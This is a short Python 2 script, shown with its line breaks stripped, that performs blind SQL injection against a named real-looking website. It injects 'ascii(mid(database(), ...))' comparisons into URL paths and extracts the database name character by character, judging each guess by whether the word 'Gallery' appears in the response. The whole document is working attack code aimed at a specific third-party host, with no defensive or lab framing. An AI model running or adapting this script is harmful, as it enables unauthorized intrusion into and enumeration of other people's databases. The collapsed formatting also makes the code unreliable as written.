#!/usr/bin/env python#coding=utf-8import sysimport reimport osimport urllib, urllib2import httplibimport requestsimport base64def generatePayloads():    payloads = [chr(x) for x in xrange(97, 123)]    payloads.extend([str(x) for x in xrange(10)])    payloads.extend(['@', '_', '.'])    return payloadsparams = "?id=1' and ascii(mid(user(), %s, 1)) = %s  --+"payloads = generatePayloads()headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36'}u = ''for x in xrange(30):    for payload in payloads:        req = requests.get('http://download.jikexueyuan.com' + "/detail/id/1970 and ascii(mid(database(), %s, 1)) = %s --.html" % (x, ord(payload)))        html = req.content                if 'Gallery' in html:            u += payload            print u            print '-' * len(u)print u
